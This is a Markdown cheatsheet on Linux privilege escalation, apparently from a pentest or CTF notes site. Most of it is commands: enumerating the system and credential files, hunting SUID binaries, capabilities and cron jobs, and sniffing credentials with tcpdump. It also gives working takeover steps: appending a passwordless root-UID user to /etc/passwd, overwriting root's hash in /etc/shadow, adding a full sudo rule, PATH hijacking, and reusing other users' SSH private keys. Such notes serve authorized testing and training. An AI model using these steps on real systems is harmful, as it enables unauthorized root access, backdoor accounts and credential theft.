---
title: Linux Privilege Escalation
description: Linux Privilege Escalation cheatsheet
date: 1970-01-22
categories: [Cheatsheets]
tags: [cheatsheets,linux-privilege-escalation]
---

- [LinPEAS](https://github.com/carlospolop/PEASS-ng): automatically looks for privilege escalation vectors
- [pspy](https://github.com/DominicBreuker/pspy/releases): monitor processes
- [GTFOBins](https://gtfobins.github.io/): sudo, suid and capabilities
- metasploit: `post/multi/recon/local_exploit_suggester`

## System enumeration

```
whoami
id
uname -a
ps aux | grep root
history
env
echo $PATH
cat /etc/passwd | grep "sh$"
find / -writable 2>/dev/null
dpkg -l
```

## Interesting files and directories

```
find / -type f -user <username> -readable 2>/dev/null
find / -writable -type d 2>/dev/null
```

```
/etc/passwd
/etc/shadow
/etc/sudoers
/etc/hosts
/etc/crontab
/home/<user>/.bash_history
```

```
/root
/var/www
/var/www/html
/opt
/tmp
/dev/shm
/var/mail
/var/spool/mail
/home/<user>
/home/<user>/.ssh
/etc/apache2
/etc/nginx
```

## SUDO, SUID and SGID

- `sudo -l`: list commands the current user can run with sudo
- `find / -perm -u=s -type f 2>/dev/null`: SUID
- `find / -perm -g=s -type f 2>/dev/null`: SGID
- try path hijacking: `export PATH=/tmp:$PATH`

## Capabilities

```
getcap -r / 2>/dev/null
```

## Cron Jobs

- domains: modify `/etc/hosts`
- commands without setting the path
- wildcards

```
cat /etc/crontab
crontab -l

pspy
```

## Network

- `ifconfig`: interfaces e.g. for wifi or docker
- `netstat -tulpn`: open ports
- `tcpdump`: sniff credentials

## Writable password files

### /etc/passwd

```console
echo "root2::0:0::/root:/bin/bash" >> /etc/passwd
su - root2
```

### /etc/shadow
1. `python -c "import crypt; print crypt.crypt('NewRootPassword')"`
2. `nano /etc/shadow`
3. Replace root's hash with the output that you generated
4. `su root`

### /etc/sudoers
```console
echo "root ALL=(ALL:ALL) ALL" >> /etc/sudoers
sudo su
```

## SSH

```console
find / -name id_rsa 2> /dev/null
find / -name authorized_keys 2> /dev/null
```

1. Copy `id_rsa` contents of keys found with the above command
2. Create a local file on your box and paste the content in
3. `chmod 600 id_rsa`
4. `ssh -i id_rsa <user>@<ip>`
